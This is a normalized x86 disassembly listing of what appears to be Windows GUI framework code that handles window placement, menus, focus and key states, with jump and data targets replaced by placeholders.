mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43bc40
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_440d58
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43ac18
pop esi
pop ebx
retn
sub_455e10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_440d58
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43ffac
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44e284
sub_455e70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f048
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44dc98
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_455ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44e4f8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_455ef4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_455f8f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f96
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44dbf8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45ad40
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_437680
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45ad40
jmp r-xdata
sub_455fbc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403394
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_455ffc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cefc
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_456028
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4557e8
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_437458
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_456080
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43fe90
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4596f4
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403394
sub_45610c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_440d58
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_440d58
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4561a4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440d58
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_455784
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403394
sub_4561fc
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44128c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_456228
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4557e8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_456244
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44dc28
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44dc28
sub_456284
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4562bc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f3c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4562f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_456441
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456448
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_456244
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_4373fc
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412bb8
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43a088
lea eax [ ebp - 0x1c ]
call sub_406a00
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_456244
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_456284
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45a9e4
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45aa4c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45aa4c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4562bc
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412bb8
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43a088
lea eax [ ebp - 0x1c ]
call sub_406a00
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45a97c
test [ esi + 0x228 ] 0x8
je r-xdata
sub_456450
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_4564c4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4564f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f2f4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_454500
lea edx [ ebp - 0x14 ]
call sub_457cc8
push ebp
mov eax [ ebp - 0x4 ]
call sub_454500
lea edx [ ebp - 0x24 ]
call sub_457cc8
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_4564c4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_454500
lea edx [ ebp - 0x24 ]
call sub_457cc8
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4564c4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4564c4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4564c4
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_4565a8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403394
pop esi
pop ebx
retn
sub_4565cc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403394
pop esi
pop ebx
retn
sub_4565f0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_4401d4
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44128c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44128c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45668c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456bf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45ae30
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_456bd9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456be0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
push ebp
push j_sub_403638#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_456744
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455838
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e2b0
jmp r-xdata
mov eax [ rw-data ]
call sub_457f24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439f74
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_440d58
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_457f18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439fb8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
call sub_45149c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_457f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439f74
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_457f24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43a7d0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_457f48
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439fb8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_457f18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_454ae8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_454ae8
jmp r-xdata
sub_456749
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a544
call sub_4039a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_457f24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439f74
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_457f18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439fb8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_457f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439f74
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_457f24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456be0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43a7d0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_457f48
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439fb8
mov edx [ ebp - 0x4 ]
